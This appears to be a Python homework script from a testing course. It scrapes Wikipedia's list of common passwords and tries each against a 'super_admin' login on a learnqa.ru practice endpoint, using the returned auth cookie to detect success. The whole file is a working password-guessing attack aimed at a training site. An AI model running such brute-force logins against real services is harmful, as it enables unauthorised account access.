import requests
from lxml import html

response1 = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response1.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[' \
          '@align="left"]/text() '
passwords = tree.xpath(locator)

answer = "You are NOT authorized"
for i in passwords:
    i = str(i).strip()
    payload = {"login": "super_admin", "password": i}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response2.cookies.get("auth_cookie")
    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})
    response3 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response3.text != answer:
        print("Password:", i)
        print(response3.text)
        break
